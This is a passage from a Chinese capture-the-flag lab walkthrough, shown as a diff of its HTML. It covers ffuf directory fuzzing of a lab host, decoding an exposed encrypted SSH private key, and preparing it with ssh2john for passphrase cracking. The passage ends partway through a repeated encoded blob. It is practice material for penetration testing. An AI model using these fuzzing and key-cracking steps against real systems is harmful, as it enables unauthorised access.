-<code>ffuf -u "http://192.168.174.132/~secret/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .txt,.php,bak,html -mc 200</code></p><p><code>ffuf -u "http://192.168.174.132/~secret/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.php,bak,html -mc 200</code></p><p><code>ffuf -u "http://192.168.174.132/~secret/FUZZ" -w /usr/share/wordlists/wfuzz/general/common.txt -e .txt,.php,bak,html -mc 200</code></p><p>结果以上三个都不行，额，不破解了，直接用<code>.mysecret.txt</code></p><h1 id=二信息解密和爆破>二、信息解密和爆破<a class=anchor href=#%e4%ba%8c%e4%bf%a1%e6%81%af%e8%a7%a3%e5%af%86%e5%92%8c%e7%88%86%e7%a0%b4>#</a></h1><p>访问<code>http://192.168.174.132/~secret/.mysecret.txt</code>，获得</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>cGxD6KNZQddY6iCsSuqPzUdqSx4F5ohDYnArU3kw5dmvTURqcaTrncHC3NLKBqFM2ywrNbRTW3eTpUvEz9qFuBnyhAK8TWu9cFxLoscWUrc4rLcRafiVvxPRpP692Bw5bshu6ZZpixzJWvNZhPEoQoJRx7jUnupsEhcCgjuXD7BN1TMZGL2nUxcDQwahUC1u6NLSK81Yh9LkND67WD87Ud2JpdUwjMossSeHEbvYjCEYBnKRPpDhSgL7jmTzxmtZxS9wX6DNLmQBsNT936L6VwYdEPKuLeY6wuyYmffQYZEVXhDtK6pokmA3Jo2Q83cVok6x74M5DA1TdjKvEsVGLvRMkkDpshztiGCaDu4uceLw3iLYvNVZK75k9zK9E2qcdwP7yWugahCn5HyoaooLeBDiCAojj4JUxafQUcmfocvugzn81GAJ8LdxQjosS1tHmriYtwp8pGf4Nfq5FjqmGAdvA2ZPMUAVWVHgkeSVEnooKT8sxGUfZxgnHAfER49nZnz1YgcFkR73rWfP5NwEpsCgeCWYSYh3XeF3dUqBBpf6xMJnS7wmZa9oWZVd8Rxs1zrXawVKSLxardUEfRLh6usnUmMMAnSmTyuvMTnjK2vzTBbd5djvhJKaY2szXFetZdWBsRFhUwReUk7DkhmCPb2mQNoTSuRpnfUG8CWaD3L2Q9UHepvrs67YGZJWwk54rmT6v1pHHLDR8gBC9ZTfdDtzBaZo8sesPQVbuKA9VEVsgw1xVvRyRZz8JH6DEzqrEneoibQUdJxLVNTMXpYXGi68RA4V1pa5yaj2UQ6xRpF6otrWTerjwALN67preSWWH4vY3MBv9Cu6358KWeVC1YZAXvBRwoZPXtquY9EiFL6i3KXFe3Y7W4Li7jF8vFrK6woYGy8soJJYEbXQp2NWqaJNcCQX8umkiGfNFNiRoTfQmz29wBZFJPtPJ98UkQwKJfSW9XKvDJwduMRWey2j61yaH4ij5uZQXDs37FNV7TBj71GGFGEh8vSKP2gg5nLcACbkzF4zjqdikP3TFNWGnij5az3AxveN3EUFnuDtfB4ADRt57UokLMDi1V73Pt5PQe8g8SLjuvtNYpo8AqyC3zTMSmP8dFQgoborCXEMJz6npX6QhgXqpbhS58yVRhpW21Nz4xFkDL8QFCVH2beL1PZxEghmdVdY9N3pVrMBUS7MznYasCruXqWVE55RPuSPrMEcRLoCa1XbYtG5JxqfbEg2aw8BdMirLLWhuxbm3hxrr9ZizxDDyu3i1PLkpHgQw3zH4GTK2mb5fxuu9W6nGWW24wjGbxHW6aTneLweh74jFWKzfSLgEVyc7RyAS7Qkwkud9ozyBxxsV4VEdf8mW5g3nTDyKE69P34SkpQgDVNKJvDfJvZbL8o6BfPjEPi125edV9JbCyNRFKKpTxpq7QSruk7L5LEXG8H4rsLyv6djUT9nJGWQKRPi3Bugawd7ixMUYoRMhagBmGYNafi4JBapacTMwG95wPyZT8Mz6gALq5Vmr8tkk9ry4Ph4U2ErihvNiFQVS7U9XBwQHc6fhrDHz2objdeDGvuVHzPgqMeRMZtjzaLBZ2wDLeJUKEjaJAHnFLxs1xWXU7V4gigRAtiMFB5bjFTc7owzKHcqP8nJrXou8VJqFQDMD3PJcLjdErZGUS7oauaa3xhyx8Ar3AyggnywjjwZ8uoWQbmx8Sx71x4NyhHZUzHpi8vkEkbKKk1rVLNBWHHi75HixzAtNTX6pnEJC3t7EPkbouDC2eQd9i6K3CnpZHY3mL7zcg2PHesRSj6e7oZBoM2pSVTwtXRFBPTyFmUavtitoA8kFZb4DhYMcxNyLf7r8H98WbtCshaEBaY7b5CntvgFFEucFanfbz6w8cDyXJnkzeW1fz19Ni9i6h4Bgo6BR8Fkd5dheH5TGz47VFH6hmY3aUgUvP8Ai2F2jKFKg4i3HfCJHGg1CXktuqznVucjWmdZmuACA2gce2rpiBT6GxmMrfSxDCiY32axw2QP7nzEBvCJi58rVe8JtdESt2zHGsUga2iySmusfpWqjYm8kfmqTbY4qAK13vNMR95QhXV9VYp9qffG5YWY163WJV5urYKM6BBiuK9QkswCzgPtjsfFBBUo6vftNqCNbzQn4NMQmxm28hDMDU8GydwUm19ojNo1scUMzGfN4rLx7bs3S9wYaVLDLiNeZdLLU1DaKQhZ5cFZ7iymJHXuZFFgpbYZYFigLa7SokXis1LYfbHeXMvcfeuApmAaGQk6xmajEbpcbn1H5QQiQpYMX3BRp41w9RVRuLGZ1yLKxP37ogcppStCvDMGfiuVMU5SRJMajLXJBznzRSqBYwWmf4MS6B57xp56jVk6maGCsgjbuAhLyCwfGn1LwLoJDQ1kjLmnVrk7FkUUESqJKjp5cuX1EUpFjsfU1HaibABz3fcYY2cZ78qx2iaqS7ePo5Bkwv5XmtcLELXbQZKcHcwxkbC5PnEP6EUZRb3nqm5hMDUUt912ha5kMR6g4aVG8bXFU6an5PikaedHBRVRCygkpQjm8Lhe1cA8X2jtQiUjwveF5bUNPmvPGk1hjuP56aWEgnyXzZkKVPbWj7MQQ3kAfqZ8hkKD1VgQ8pmqayiajhFHorfgtRk8ZpuEPpHH25aoJfNMtY45mJYjHMVSVnvG9e3PHrGwrks1eLQRXjjRmGtWu9cwT2bjy2huWY5b7xUSAXZfmRsbkT3eFQnGkAHmjMZ5nAfmeGhshCtNjAU4idu8o7HMmMuc3tpK6res9HTCo35ujK3UK2LyMFEKjBNcXbigDWSM34mXSKHA1M4MF7dPewvQsAkvxRTCmeWwRWz6DKZv2MY1ezWd7mLvwGo9ti9SMTXrkrxHQ8DShuNorjCzNCuxLNG9ThpPgWJoFb1sJL1ic9QVTvDHCJnD1AKdCjtNHrG973BVZNUF6DwbFq5d4CTLN6jxtCFs3XmoKquzEY7MiCzRaq3kBNAFYNCoVxRBU3d3aXfLX4rZXEDBfAgtumkRRmWowkNjs2JDZmzS4H8nawmMa1PYmrr7aNDPEW2wdbjZurKAZhheoEYCvP9dfqdbL9gPrWfNBJyVBXRD8EZwFZNKb1eWPh1sYzUbPPhgruxWANCH52gQpfATNqmtTJZFjsfpiXLQjdBxdzfz7pWvK8jivhnQaiajW3pwt4cZxwMfcrrJke14vN8Xbyqdr9zLFjZDJ7nLdmuXTwxPwD8Seoq2hYEhR97DnKfMY2LhoWGaHoFqycPCaX5FCPNf9CFt4n4nYGLau7ci5uC7ZmssiT1jHTjKy7J9a4q614GFDdZULTkw8Pmh92fuTdK7Z6fweY4hZyGdUXGtPXveXwGWES36ecCpYXPSPw6ptVb9RxC81AZFPGnts85PYS6aD2eUmge6KGzFopMjYLma85X55Pu4tCxyF2FR9E3c2zxtryG6N2oVTnyZt23YrEhEe9kcCX59RdhrDr71Z3zgQkAs8uPMM1JPvMNgdyNzpgEGGgj9czgBaN5PWrpPBWftg9fte4xYyvJ1BFN5WDvTYfhUtcn1oRTDow67w5zz3adjLDnXLQc6MaowZJ2zyh4PAc1vpstCRtKQt35JEdwfwUe4wzNr3sidChW8VuMU1Lz1cAjvcVHEp1Sabo8FprJwJgRs5ZPA7Ve6LDW7hFangK8YwZmRCmXxArBFVwjfV2SjyhTjhdqswJE5nP6pVnshbV8ZqG2L8d1cwhxpxggmu1jByELxVHF1C9T3GgLDvgUv8nc7PEJYoXpCoyCs55r35h9YzfKgjcJkvFTdfPHwW8fSjCVBuUTKSEAvkRr6iLj6H4LEjBg256G4DHHqpwTgYFtejc8nLX77LUoVmACLvfC439jtVdxCtYA6y2vj7ZDeX7zp2VYR89GmSqEWj3doqdahv1DktvtQcRBiizMgNWYsjMWRM4BPScnn92ncLD1Bw5ioB8NyZ9CNkMNk4Pf7Uqa7vCTgw4VJvvSjE6PRFnqDSrg4avGUqeMUmngc5mN6WEa3pxHpkhG8ZngCqKvVhegBAVi7nDBTwukqEDeCS46UczhXMFbAgnQWhExas547vCXho71gcmVqu2x5EAPFgJqyvMmRScQxiKrYoK3p279KLAySM4vNcRxrRrR2DYQwhe8YjNsf8MzqjX54mhbWcjz3jeXokonVk77P9g9y69DVzJeYUvfXVCjPWi7aDDA7HdQd2UpCghEGtWSfEJtDgPxurPq8qJQh3N75YF8KeQzJs77Tpwcdv2Wuvi1L5ZZtppbWymsgZckWnkg5NB9Pp5izVXCiFhobqF2vd2jhg4rcpLZnGdmmEotL7CfRdVwUWpVppHRZzq7FEQQFxkRL7JzGoL8R8wQG1UyBNKPBbVnc7jGyJqFujvCLt6yMUEYXKQTipmEhx4rXJZK3aKdbucKhGqMYMHnVbtpLrQUaPZHsiNGUcEd64KW5kZ7svohTC5i4L4TuEzRZEyWy6v2GGiEp4Mf2oEHMUwqtoNXbsGp8sbJbZATFLXVbP3PgBw8rgAakz7QBFAGryQ3tnxytWNuHWkPohMMKUiDFeRyLi8HGUdocwZFzdkbffvo8HaewPYFNsPDCn1PwgS8wA9agCX5kZbKWBmU2zpCstqFAxXeQd8LiwZzPdsbF2YZEKzNYtckW5RrFa5zDgKm2gSRN8gHz3WqS</span></span></code></pre></div><p>经过BASE解密，获得如下内容：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span>-----BEGIN OPENSSH PRIVATE KEY-----
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span>9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span>xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span>J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span>/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span>ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span>hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span>4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">14</span><span>mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">15</span><span>MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">16</span><span>2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">17</span><span>QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">18</span><span>vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">19</span><span>0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">20</span><span>rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">21</span><span>QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">22</span><span>x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">23</span><span>nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">24</span><span>VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">25</span><span>cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">26</span><span>nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">27</span><span>8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">28</span><span>zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">29</span><span>n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">30</span><span>AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">31</span><span>oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">32</span><span>63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">33</span><span>y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">34</span><span>t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">35</span><span>Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">36</span><span>yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">37</span><span>8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">38</span><span>mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">39</span><span>VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">40</span><span>E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">41</span><span>BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">42</span><span>yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">43</span><span>wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">44</span><span>5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">45</span><span>vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">46</span><span>Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">47</span><span>1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">48</span><span>ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">49</span><span>iUJ66WmRUN9EoVlkeCzQJwivI=
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">50</span><span>-----END OPENSSH PRIVATE KEY-----</span></span></code></pre></div><p>将内容放入<code>/home/kali/Desktop/upfine</code>文件内，接着<code>python3 /usr/share/john/ssh2john.py /home/kali/Desktop/vulnhub/upfine > passwd</code>，这一步是调用python3执行kali自带的<code>ssh2john</code>脚本（专门用来处理加密SSH私钥的工具），将原始私钥文件<code>upfine</code>重定向到passwd</p><p>接着使用fasttrack进行密码爆破
+<code>ffuf -u &quot;http://192.168.174.132/~secret/FUZZ&quot; -w /usr/share/wordlists/dirb/common.txt -e .txt,.php,bak,html -mc 200</code></p>
+<p><code>ffuf -u &quot;http://192.168.174.132/~secret/FUZZ&quot; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.php,bak,html -mc 200</code></p>
+<p><code>ffuf -u &quot;http://192.168.174.132/~secret/FUZZ&quot; -w /usr/share/wordlists/wfuzz/general/common.txt -e .txt,.php,bak,html -mc 200</code></p>
+<p>结果以上三个都不行，额，不破解了，直接用<code>.mysecret.txt</code></p>
+<h1 id="二信息解密和爆破">二、信息解密和爆破<a class="anchor" href="#%e4%ba%8c%e4%bf%a1%e6%81%af%e8%a7%a3%e5%af%86%e5%92%8c%e7%88%86%e7%a0%b4">#</a></h1>
+<p>访问<code>http://192.168.174.132/~secret/.mysecret.txt</code>，获得</p>
+<pre tabindex="0"><code>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